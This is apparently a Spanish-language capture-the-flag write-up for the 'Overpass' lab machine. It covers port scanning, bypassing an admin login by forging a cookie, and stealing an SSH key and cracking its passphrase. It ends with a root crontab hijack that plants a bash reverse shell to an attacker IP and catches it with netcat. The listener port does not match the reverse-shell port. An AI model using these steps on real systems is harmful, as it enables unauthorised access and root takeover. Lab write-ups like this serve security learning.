---
title: "Overpass"
description: "Overpass"
pubDate: 2025-05-20
---

# Fase de reconocimiento

## Buscamos puertos abiertos

````
nmap -sS -p- -T5 --min-rate=5000 -vvv -Pn -n 10.10.36.26
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240501183622.png)

## Reconocimiento de servicios

````
nmap -sVC -p22,80 -Pn 10.10.36.26
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240501183722.png)

## Gobuster

````
gobuster dir -u http://10.10.36.26 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240501183933.png)

# Fase de ataque

Tenemos un Javascript en /admin que cuando inicia sesión con la contraseña correcta crea una Cookie.

1. Creamos una Cookie con ese nombre y cualquier valor
   ![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240501185742.png)
1. Copiamos la clave privada SSH
1. Nos conectamos por SSH

````
ssh saad@10.10.39.180 -i id_rsa 
````

Pide passphrase

## Crack passphrase

1. Convertimos la clave privadaa formato john

````
ssh2john id_rsa > id_rsa.john
````

2. La crackeamos con john

````
john id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240501190250.png)
Found!
3. Nos conectamos por SSH

````
ssh saad@10.10.39.180 -i id_rsa 
````

\[-\] ==pwned!==

# Privilege Escalation

Como ellos crearon su propio password manager tienen las claves guardadas en .overpass
Encontramos la contraseña de James pero no sirve para mucho

Tiene un crontab del overpass. /etc/crontab
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240501191937.png)

1. Creamos un servidor web

````
python3 -m http.server 80
````

2. Creamos los directorios del crontab

````
mkdir /dowloads/src
````

3. Creamos el fichero buildscript.sh con nuestra reverse shell

````
bash -i >& /dev/tcp/10.9.2.97/1111 0>&1
````

4. Nos ponemos en escucha por el puerto 111 para recibir la Shell

````
nc -nlvp 443
````

5. Modificamos el /etc/hosts de la maquina para que overpass.thm redirija a nuestro servidor
   ![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240501193602.png)

\[+\] ==pwned!==
